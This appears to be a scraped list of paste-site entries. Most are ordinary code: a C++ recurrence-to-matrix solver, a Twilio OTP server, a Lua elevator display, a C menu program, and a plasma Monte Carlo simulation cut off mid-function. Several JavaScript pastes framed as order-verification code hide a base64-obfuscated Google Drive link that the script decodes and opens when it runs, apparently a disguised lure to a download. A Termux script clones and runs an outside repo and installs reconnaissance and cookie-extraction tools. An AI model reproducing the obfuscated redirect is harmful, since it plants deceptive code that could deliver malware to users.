      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NYKqq6t8,Market.js,WantingTrae,JavaScript,Monday 21st of April 2025 11:51:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24232/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HSSKBbPg,Untitled,WantingTrae,JavaScript,Monday 21st of April 2025 11:35:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20460/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FJLJCFWd,♥️Special 1st install T-life♥️,RebelRose,Bash,Monday 21st of April 2025 11:28:56 AM CDT,"apt update && apt full-upgrade -y && pkg update && pkg upgrade -y && pkg install git zsh -y 
git clone https://github.com/ghoste9624/anonybash 
cd anonybash 
chmod +x anon.sh
bash anon.sh
exit

apt update && apt full-upgrade -y && apt autoclean && apt autoremove -y && apt install git wget zip unzip python python2 nodejs-lts jq libxml2-utils grep bc htop figlet httping dnsutils openssh ffmpeg php nano zsh clang nmap whois libffi openssl screenfetch w3m vim cowsay curl perl ruby rust sqlite fakeroot sshpass golang lychee proot proot-distro lynx rxfetch neofetch -y
pip2.7 install requests 
termux-setup-storage

 pkg install python-pip

pip install customtkinter
pip install colorama
pip install psutil
pip install keyboard
pip install requests
pip install dnspython
pip install deep-translator
pip install phonenumbers
pip install bcrypt
pip install beautifulsoup4
pip install whois
pip install screeninfo
pip install GPUtil
pip install pycryptodome
pip install discord.py
pip install discord
pip install Pillow
pip install browser-cookie3
pip install virtualenv
pkg install tcsh
pip install xonsh
pkg install beanshell
pkg install binutils
pkg install binutils-is-llvm
pkg install alsa-utils
pip install allay
pip install ping3
apt install hunspell 
pkg install rustscan
pip install MetaDetective
pkg install photon-rss
pip install hashtray
pip install masto
pip install ignorant
pip install oxdork
pip3 install r3con1z3r
pip install funny-words
pip3 install linkchecker
pip install holehe
pip install arachnid-spider
pip install social-analyzer
pip install badurls
pkg install nodejs
pkg install nodejs-lt
pkg install fortune 
pip install google 
pip install faker
pkg install toilet 
pip install figlet 
pip3 install TUIFIManager --upgrade
pkg install curl -y
pkg install git -y
pkg install wget -y
pkg install zip -y
pkg install unzip -y
pkg install python -y
pkg install nodejs-lts -y
pkg install jq -y
pkg install libxml2-utils -y
pkg install grep -y
pkg install bc -y
pkg install htop -y
pkg install figlet -y
pkg install httping -y
pkg install dnsutils -y
pkg install openssh -y
pkg install ffmpeg -y 
pkg install php -y
pkg install nano -y
pkg install zsh -y
pip install --upgrade pip setuptools 
pip install --upgrade httpie 
pip install -U requests[socks] 
pkg install clang 
pkg install nmap -y
pkg install libffi -y
pkg install openssl -y
pip install ddgr 
pkg install screenfetch 
pkg install w3m -y
pkg install cowsay -y
pkg install perl -y
pkg install ruby -y
pkg install rust -y
pkg install sqlite -y
pkg install fakeroot -y
pkg install sshpass -y
pkg install golang -y
pkg install lychee -y
pkg install termux-api -y
pkg install termux-exec -y

pkg update -y
pkg upgrade -y 
pkg autoclean
pkg clean -y "
my5dEuFD,Products.js,WantingTrae,JavaScript,Monday 21st of April 2025 11:20:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/65650/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fxCLJ72n,Transform recursive formula into a matrix,prog3r,C++,Monday 21st of April 2025 11:10:53 AM CDT,"#include <bits/stdc++.h>
using namespace std;
#define int long long
using Single = pair<vector<int>*, int>;
using Multi = vector<Single>;
using PolyM = vector<Multi>;
map<Multi, PolyM> Eq;
int LAST_IDX_SET = -1e9;
constexpr int MOD = 1e9+7;
vector<vector<int>> temp_m(1000, vector<int>(1000));
ostream& operator<<(ostream& out, const vector<vector<int>>& mat) {
    for (const auto &x : mat) {
        for (const auto &y : x) {
            out << y << "" "";
        }out << ""\n"";
    }
    return out;
}
void operator*=(vector<vector<int>> &a, const vector<vector<int>>& b) {
    for (const auto &x : a) {
        assert(x.size() == a[0].size());
    }
    for (const auto &y : b) {
        assert(y.size() == b[0].size());
    }
    int skal_size = a[0].size();
    assert(a[0].size() == b.size());
    for (int i = 0; i < a.size(); i += 1) {
        for (int j = 0; j < b[0].size(); j += 1) {
            temp_m[i][j] = 0;
            for (int k = 0; k < skal_size; k += 1) {
                temp_m[i][j] += a[i][k] * b[k][j] % MOD;
            }
            temp_m[i][j] %= MOD;
        }
    }
    for (auto &x : a) {
        x.resize(b[0].size());
    }
    for (int i = 0; i < a.size(); i += 1) {
        for (int j = 0; j < a[i].size(); j += 1) {
            a[i][j] = temp_m[i][j];
        }
    }
}
void operator^=(vector<vector<int>>& mat, int b) {
    assert(b >= 0);
    assert(mat.size() == mat[0].size());
    vector<vector<int>> ret(mat.size(), vector<int>(mat.size()));
    for (int i = 0; i < mat.size(); i += 1) {
        ret[i][i] = 1;
    }
    while (b) {
        if (b&1) {
            ret *= mat;
        }
        mat *= mat;
        b >>= 1;
    }
    mat = ret;
}
int query_fast(vector<vector<int>> Matrix, const int n, const int mini, const vector<vector<int>>& base,
               const vector<Multi>& list, vector<int>* f) {
    if (n <= LAST_IDX_SET) {
        return f->at(n);
    }
    if (!(n >= -mini)) {
        throw invalid_argument(""Недостаточно начальных значений"");
    }
    Matrix ^= n - (-mini);
    Matrix *= base;
    for (int i = 0; i < Matrix.size(); i += 1) {
        if (list[i] == Multi{{f, 0}}) {
            return Matrix[i][0];
        }
    }
    assert(false);
}
int query_slow(const int n, const map<Multi, PolyM>& slow_eq, vector<int>* f) {
    if (n <= LAST_IDX_SET) {
        return f->at(n);
    }
    int curr = LAST_IDX_SET+1;
    for (const auto &[a, b] : slow_eq) {
        for (const auto &S : a) {
            S.first->resize(n+1);
        }
        for (const auto &M : b) {
            for (const auto &S : M) {
                if (!(curr+S.second >= 0)) {
                    throw invalid_argument(""Недостаточно начальных значений"");
                }
            }
        }
    }
    while (curr <= n) {
        for (const auto &[a, b] : slow_eq) {
            assert(a.size() == 1);
            int su = 0;
            for (const auto &M : b) {
                int mul = 1;
                for (const auto &S : M) {
                    (mul *= S.first->at(curr+S.second)) %= MOD;
                }
                (su += mul) %= MOD;
            }
            assert(a.front().second == 0);
            a.front().first->at(curr) = su;
        }
        curr += 1;
    }
    return f->at(n);
}
signed main() {
    vector<int> f(200), r(200), sz(200), fib(200), none(200, 0), one(200, 1);
    Eq[{{&none, 0}}] = {
            {{&none, -1},},
    };
    Eq[{{&one, 0}}] = {
            {{&one, -1},},
    };
    auto test_on_fibonacci_trees = [&] () -> void {
        f[0] = 0;
        f[1] = 0;
        r[0] = 0;
        r[1] = 0;
        sz[0] = 1;
        sz[1] = 1;
        LAST_IDX_SET = 1;
        Eq[{{&sz, 0}}] = {
                {{&sz, -1},},
                {{&sz, -2},},
                {{&one, -1},},
        };
        Eq[{{&r, 0}}] = {
                {{&sz, -1},},
                {{&r, -1},},
                {{&sz, -2},},
                {{&r, -2},},
        };
        Eq[{{&f, 0}}] = {
                {{&f, -1}},
                {{&f, -2}},

                {{&sz, -1}, {&r, -2}},
                {{&sz, -1}, {&sz, -2}},
                {{&r, -2},},
                {{&sz, -2},},

                {{&sz, -2}, {&r, -1}},
                {{&sz, -2}, {&sz, -1}},
                {{&r, -1},},
                {{&sz, -1},},
        };
    };
    auto test_on_fibonacci = [&] () -> void {
        f[0] = 0;
        f[1] = 1;
        LAST_IDX_SET = 1;
        Eq[{{&f, 0}}] = {
                {{&f, -1}},
                {{&f, -2}},
        };
    };
    auto another_test = [&] () -> void {
        // f[i] = (fib[i] * fib[i-1] + f[i-1]) % MOD;
        fib[0] = 0;
        fib[1] = 1;
        f[0] = 0;
        f[1] = 0;
        LAST_IDX_SET = 1;
        Eq[{{&fib, 0}}] = {
                {{&fib, -1}},
                {{&fib, -2}},
        };
        Eq[{{&f, 0}}] = {
                {{&fib, 0}, {&fib, -1}},
                {{&f, -1}},
        };
    };
//    test_on_fibonacci();
//    test_on_fibonacci_trees();
    another_test();
    if (Eq.empty()) {
        throw invalid_argument(""No recursive formulas given (Не даны рекуррентные уравнения)"");
    }
    auto slow_Eq = Eq;
    map<vector<int>*, string> mp;
    mp[&none] = ""NULL"";
    mp[&one] = ""ONE"";
    mp[&sz] = ""sz"";
    mp[&r] = ""r"";
    mp[&f] = ""f"";
    auto check = [&] () -> void {
        for (auto &[a, b] : Eq) {
            for (auto &M : b) {
                sort(M.begin(), M.end());
            }
            sort(b.begin(), b.end());
            if (a.size() == 1 && (a.front().first == &none || a.front().first == &one)) {
                continue;
            }
            PolyM nw_b;
            for (const auto &M : b) {
                Multi nw_m;
                bool bad = false;
                bool got_one = false;
                for (const auto &S : M) {
                    if (S.first != &one) {
                        nw_m.push_back(S);
                    } else {
                        got_one = true;
                    }
                    bad |= S.first == &none;
                }
                if (!bad) {
                    if(!nw_m.size() && got_one) {
                        nw_m.push_back({&one, -1});
                    }
                    if (nw_m.size()) {
                        nw_b.push_back(nw_m);
                    }
                }
            }
            b = nw_b;
            for (const auto &S : a) {
                assert(S.second <= 0);
            }
            for (const auto &M : b) {
                for (const auto &S : M) {
                    assert(S.second <= 0);
                }
            }
        }
        while (true) {
            set<Multi> add;
            for (const auto &[a, b] : Eq) {
                for (const auto &M : b) {
                    bool good = true;
                    for (const auto &S : M) {
                        good &= S.second < 0;
                    }
                    if (good) {
                        auto nw = M;
                        for (auto &S : nw) {
                            S.second += 1;
                        }
                        if (!Eq.count(nw)) {
                            add.insert(nw);
                        }
                    }
                }
            }
            for (const auto &y : add) {
                Eq[y] = {y};
            }
            if (!add.size()) {
                break;
            }
        }
    };
//    auto print = [&] () -> void {
//        for (const auto &[a, b] : Eq) {
//            for (const auto &S : a) {
//                clog << mp[S.first] << ""["" << S.second << ""]"";
//            }
//            clog << "" = "";
//            for (int i = 0; i < b.size(); i += 1) {
//                for (const auto &S : b[i]) {
//                    clog << mp[S.first] << ""["" << S.second << ""]"";
//                }
//                if (i+1 != b.size()) {
//                    clog << "" + "";
//                }
//            } clog << ""\n"";
//        }
//        clog << ""--------\n"";
//    };
    while (true) {
        check();
//        print();
        bool done = false;
        for (auto &[a, b] : Eq) {
            for (auto &M : b) {
                for (auto &S : M) {
                    if (S.second == 0) {
                        assert(Eq.count({S}));
                        auto replace = Eq[{S}];
                        S.first = &one;
                        S.second = -1;
                        for (const auto &fromM: M) {
                            for (auto &h: replace) {
                                h.push_back(fromM);
                            }
                        }
                        S.first = &none;
                        S.second = -1;
                        for (const auto &x: replace) {
                            b.push_back(x);
                        }
                        done = true;
                        break;
                    }
                } if (done) break;
            } if (done) break;
        }
        if (!done) {
            break;
        }
    }
    map<Multi, int> order;
    vector<Multi> list;
    for (const auto &[a, b] : Eq) {
        assert(!order.count(a));
        order[a] = order.size();
        list.push_back(a);
    }
    vector<vector<int>> Matrix(order.size(), vector<int>(order.size()));
    int mini = 1e9;
    for (const auto &[a, b] : Eq) {
        assert(order.count(a));
        for (const auto &S : a) {
            mini = min(mini, S.second);
        }
        for (const auto &M : b) {
            auto from = M;
            for (auto &x : from) {
                x.second += 1;
            }
            assert(order.count(from));
            Matrix[order[a]][order[from]] += 1;
        }
    }
    if (!(LAST_IDX_SET >= -mini)) {
        throw invalid_argument(""Недостаточно начальных значений"");
    }
    vector<vector<int>> base;
    for (const auto &S : list) {
        int tot = 1;
        for (const auto &[ptr, diff] : S) {
            (tot *= ptr->at(-mini+diff)) %= MOD;
        }
        base.push_back({tot});
    }
    int q = 1e3;
    q = 1;
    mt19937_64 mt(chrono::high_resolution_clock::now().time_since_epoch().count());
    uniform_int_distribution<int> distrib(1, 1e4);
    for (int ii = 0; ii < q; ii += 1) {
        int n = distrib(mt);
        cin >> n;
        cout << query_fast(Matrix, n, mini, base, list, &f) << ""\n"";
//        clog << ""f["" << n << ""]: "";
//        clog << query_fast(Matrix, n, mini, base, list, &f) << "", ""
//             << query_slow(n, slow_Eq, &f) << ""\n"";
//        assert(query_fast(Matrix, n, mini, base, list, &f) == query_slow(n, slow_Eq, &f));
    }
}"
hC78zTep,Order.js,WantingTrae,JavaScript,Monday 21st of April 2025 11:04:57 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/87425/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
CL4PG0Qa,012 (Twilio OTP Server),xerocool-101,JavaScript,Monday 21st of April 2025 10:51:53 AM CDT,"✅ Backend: Node.js + Express (Twilio OTP Server)
npm install express cors dotenv twilio

.env
PORT=5000
TWILIO_SID=your_twilio_sid
TWILIO_AUTH_TOKEN=your_twilio_auth_token
TWILIO_PHONE=+1234567890

📄 twilioClient.js
import twilio from 'twilio';
import dotenv from 'dotenv';
dotenv.config();

const client = twilio(process.env.TWILIO_SID, process.env.TWILIO_AUTH_TOKEN);
export default client;

📄 routes/otp.js
import express from 'express';
import client from '../twilioClient.js';

const router = express.Router();
const otpStore = {};

router.post('/send', async (req, res) => {
  const { phone } = req.body;
  const code = Math.floor(100000 + Math.random() * 900000).toString();
  otpStore[phone] = { code, expires: Date.now() + 300000 };

  await client.messages.create({
    body: `Your OTP is: ${code}`,
    from: process.env.TWILIO_PHONE,
    to: phone,
  });

  res.json({ message: 'OTP sent' });
});

router.post('/verify', (req, res) => {
  const { phone, code } = req.body;
  const record = otpStore[phone];

  if (!record || Date.now() > record.expires) {
    return res.status(400).json({ success: false, message: 'OTP expired or invalid' });
  }

  if (record.code !== code) {
    return res.status(400).json({ success: false, message: 'Invalid OTP' });
  }

  delete otpStore[phone];
  res.json({ success: true, message: 'OTP verified' });
});

export default router;

📄 server.js
import express from 'express';
import dotenv from 'dotenv';
import cors from 'cors';
import otpRoutes from './routes/otp.js';

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

app.use('/api/otp', otpRoutes);

app.listen(process.env.PORT, () => {
  console.log(`Server running on port ${process.env.PORT}`);
});

💻 Frontend: React (Vite)
📦 Install Vite + Axios
npm create vite@latest frontend --template react
cd frontend
npm install axios

📄 OtpForm.jsx
import { useState } from 'react';
import axios from 'axios';

const API = 'http://localhost:5000/api/otp';

export default function OtpForm() {
  const [phone, setPhone] = useState('');
  const [code, setCode] = useState('');
  const [stage, setStage] = useState('input');

  const sendOTP = async () => {
    await axios.post(`${API}/send`, { phone });
    setStage('verify');
  };

  const verifyOTP = async () => {
    const res = await axios.post(`${API}/verify`, { phone, code });
    alert(res.data.message);
  };

  return (
    <div className=""max-w-md mx-auto mt-20 p-4 border rounded"">
      <h2 className=""text-xl mb-4 font-bold"">Phone OTP Login</h2>

      {stage === 'input' ? (
        <>
          <input
            type=""text""
            placeholder=""Enter phone number""
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            className=""border p-2 w-full mb-3""
          />
          <button onClick={sendOTP} className=""bg-blue-500 text-white px-4 py-2 rounded"">
            Send OTP
          </button>
        </>
      ) : (
        <>
          <input
            type=""text""
            placeholder=""Enter OTP""
            value={code}
            onChange={(e) => setCode(e.target.value)}
            className=""border p-2 w-full mb-3""
          />
          <button onClick={verifyOTP} className=""bg-green-500 text-white px-4 py-2 rounded"">
            Verify
          </button>
        </>
      )}
    </div>
  );
}

📄 App.jsx
import OtpForm from './components/OtpForm';

function App() {
  return <OtpForm />;
}

export default App;

🧪 Test the Flow
Start your backend: node server.js
Start frontend: npm run dev
"
E8tYcvnV,Market.js,WantingTrae,JavaScript,Monday 21st of April 2025 10:49:34 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66931/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5QjfPnGF,Elevator Display,FloffenWaffles,Lua,Monday 21st of April 2025 10:39:22 AM CDT,"--monitor_7-12
--computer_3

local mon = { -- in order from top to bottom
    peripheral.wrap(""monitor_7""),
    peripheral.wrap(""monitor_8""),
    peripheral.wrap(""monitor_9""),
    peripheral.wrap(""monitor_10""),
    peripheral.wrap(""monitor_11""),
    peripheral.wrap(""monitor_12""),
    peripheral.wrap(""monitor_13""),
    peripheral.wrap(""monitor_14""),
    peripheral.wrap(""monitor_15""),
    peripheral.wrap(""monitor_16""),
    peripheral.wrap(""monitor_17""),
    peripheral.wrap(""monitor_18""),
    peripheral.wrap(""monitor_19""),
    peripheral.wrap(""monitor_20""),
    peripheral.wrap(""monitor_21"")
}
local global_space = term

local floors = {}
local function regF(num, north, south, east, west)
    floors[num] = {n = north, s = south, e = east, w = west}
end

regF(1, """", """", """", """") -- base is circular format, each floor has different spawners, each populated manually with a name
regF(2, """", """", """", """")
regF(3, """", """", """", """")
regF(4, """", """", """", """")
regF(5, """", """", """", """")
regF(6, """", """", """", """")
regF(7, """", """", """", """")
regF(8, """", """", """", """")
regF(9, """", """", """", """")
regF(10, """", """", """", """")
regF(11, """", """", """", """")
regF(12, """", """", """", """")
regF(13, """", """", """", """")
regF(14, """", """", """", """")
regF(15, "" "", "" "", ""MAINTENANCE"", "" "") -- computer, me link, power supplied

local function sw(bool, tru, fal) -- compressed if statement (switch)
    -- turning bools to two string
    if bool then return tru
    else return fal end
end

local function setCursorPos(x, y)
    global_space.setCursorPos(x, y)
end

local function clearLine(line)
    global_space.clearLine(line)
end

local function setSpace(space, scale)
    global_space = space
    space.setTextScale(scale or 1)
    space.setCursorPos(1, 1)
end

local function blitt(str, col, background)  -- interal term.blit for usage with unknown text length solid color backgrounds
    local str = tostring(str)
    local length = string.len(str)
    local sc, sb = """", """"

    for i = 1, length do
        sc = sc .. colors.toBlit(col)
        sb = sb .. colors.toBlit(background)
    end

    global_space.blit(str, sc, sb)
end

local function ordinal(num) -- 1st 2nd 3rd 11th 12th 113th 19817123rd 19817113th
    local hund = math.mod(num, 100)
    if hund < 20 and hund > 10 then return ""th"" end
    local last = math.mod(num, 10)
    if last == 1 then return ""st"" end
    if last == 2 then return ""nd"" end
    if last == 3 then return ""rd"" end
    return ""th""
end

for i, v in ipairs(mon) do
    setSpace(v, 0.5)
    v.setCursorBlink(false)
    v.clear()

    setCursorPos(1, 1)
    blitt(i .. ordinal(i) .. "" Deck"", colors.white, colors.black)
    setCursorPos(1, 2)

    local comps = floors[i]

    blitt(sw(comps.e ~= """", comps.e, ""UNOCCUPIED""), colors.white, colors.black) -- adjusted for elevator being on east wall
    setCursorPos(1, 3)
    blitt(sw(comps.w ~= """", comps.w, ""UNOCCUPIED""), colors.white, colors.black)
    setCursorPos(1, 4)
    blitt(sw(comps.s ~= """", comps.s, ""UNOCCUPIED""), colors.white, colors.black)
    setCursorPos(1, 5)
    blitt(sw(comps.n ~= """", comps.n, ""UNOCCUPIED""), colors.white, colors.black)
end

"
EBHRiDDk,menu matriz,Aluneth,C,Monday 21st of April 2025 10:36:40 AM CDT,"#include <stdio.h>
#include <stdlib.h>

void borrar(int semanas[4][4])
{
    for (int i = 0; i<4; i++)
    {
        for (int j = 0; j<4; j++)
        {

            semanas[i][j] = 0;
        }
    }
}

void cargarLocales(char local[3][31], int semanas[4][4])
{
    int f, total, numLocal, numSemana;
    total = 0;
    char continuar;
    do
    {
        printf(""Numero de local: "");
        scanf(""%d"", &numLocal);
        printf(""\nSemana: "");
        scanf(""%d"", &numSemana);

        printf(""\nValor: "");
        scanf(""%d"", &semanas[numLocal-1][numSemana-1]);
        /* for (int k = 0; k<3; k++)
        {
            printf(""Ganancias de la semana %d: "", k+1);

            total = total + semanas[f][k];
            semanas[f][3] = total;
        }
        total = 0; */
        printf(""\nSeguir [y/n]: "");
        scanf(""%c"", &continuar);
    }
    while (continuar != 'n');

}

void imprimirLocales(char local[3][31], int semanas[4][4])
{
    int f;
    printf(""Local\t"");
    for (int l = 0; l<4; l++)
    {
        printf(""S%d |\t"", l+1);
    }
    printf(""Total"");
    printf(""\n"");
    for(f=0; f<3; f++)
    {
        printf(""%s\t"", local[f]);

        for (int k = 0; k<4; k++)
        {
            printf(""%d |\t"", semanas[f][k]);
        }
        printf(""\n"");
    }
}

void menu()
{
    int opcion;
    do
    {
        printf(""1- Borrar\n2- Cargar\n3- Mostrar datos\n4- Mostrar resumen\n0- Fin\n"");
        scanf(""%d"", &opcion);
        system(""clear"");

        char locales[4][31];
        int semanas[4][4];

        switch (opcion)
        {
        case 1:
            borrar(semanas);
            break;
        case 2:
            (cargarLocales(locales, semanas));
            break;
        case 3:
            imprimirLocales(locales, semanas);
            break;
        case 4:
            printf(""Cuatro"");
            break;
        case 5:
            printf(""Cinco"");
            break;
        default:
            printf("""");
        }

    }
    while (opcion != 0);
}

int main()
{
    menu();
    char locales[4][31];
    int semanas[4][4];

    return 0;
}
"
TBPQa25c,v3.1 - stable working - fixed populations - converges with Bolsig+,phystota,C++,Monday 21st of April 2025 10:35:27 AM CDT,"#include <iostream>
#include <random>
#include <fstream>
#include <assert.h>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota

//physical constants

#define m_e 9.1093837E-31 // electron mass in kg
#define M_n 6.6464731E-27 // Helium atom mass
#define k_b 1.380649E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define Coulomb_log 15.87 // Coulomb logarithm
#define epsilon_0 8.854188E-12 // Vacuum permittivity
#define Coulomb_const pow(q,4)/(pow(4.0*M_PI*epsilon_0,2)) // e^4/(4*pi*eps0)^2
#define thresh0 0.0 //elastic threshold
#define thresh1 19.82 // threshold energy excitation tripet state
#define thresh2 20.61 // threshold energy excitation singlet state
#define tau_singlet 0.0195

// simulation parameters

#define n_e 100000
// #define N_He 1000000 // Helium neutrals number
#define T_n 2.0 // Helium neutral temperature in eV
#define T_e 10.0    // electron Maxwell initial distribution
#define Emin 0.0
#define Emax 3000.0
#define Volume 1.0E-12 // Volume to calculate netral density and collision frequency 
#define total_time 2.0E-3 // 500 microsec time to equalibrate the system
#define dopant 1.0E-5 // addition to avoid zero
#define E_reduced 1.0 // constant electrin field along z-axis

#define bin_width 0.05 // keep energy step ~ this to maintain cross-section clarity (Ramsauer minimum etc)
#define N ( (int)((Emax-Emin)/bin_width) + 1) // add 1 to include E_max if needed?

// handling final energy bin

#define bin_width_smooth 0.5 // energy bin for smooth final distribution
#define N_smooth ( (int)((Emax-Emin)/bin_width_smooth) )



double solve_A(double s) { // Netwon method solver

    if (s > 3) {
        return 3*exp(-s);
    }
    if (s < 0.01) {
        return 1.0/s;
    }
    
    double A0 = 0.01; // initial guess
    double A = A0;  //starting with initial guess
    double tol = 1.0E-7; // accuracy

             
    for (int i = 0; i < 1000; i++){

        double tanhA = tanh(A);
        // Avoid division by an extremely small tanh(A)
        if (fabs(tanhA) < 1e-12) {
            std::cerr << ""tanh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-7;
        }        

        double f = 1.0 / tanhA - 1.0 / A - exp(-s);
        if (fabs(f) < tol)
            break;

        double sinhA = sinh(A);
        if (fabs(sinhA) < 1e-12) {
            std::cerr << ""sinh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-5;
        }

        double dfdA = -1.0/(sinh(A)*sinh(A)) + 1.0/(A*A);

        // Check if derivative is too close to zero to avoid huge updates
        if (fabs(dfdA) < 1e-12) {
            std::cerr << ""dfdA is too small at iteration "" << i << "", returning fallback\n"";
            if (s < 0.01) {
//                std::cout << ""Small s! Huge A!"" << ""\n"";
                return 1.0/s;
            }
            if (s > 3) {
                return 3.0*exp(-s);
            }
        }        

        A -= f/dfdA;

        // Early check for numerical issues
        if (std::isnan(A) || std::isinf(A)) {
            std::cerr << ""Numerical error detected, invalid A at iteration "" << i << ""\n"";
            return (A > 0) ? 1.0E-5 : -1.0E-5;  // Fallback value based on sign
        }        


    }

    return A;
}

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided_en = false;
    bool collided_ee = false;

    // initializing Maxwell-Boltzmann distribution with T_e
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/m_e);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
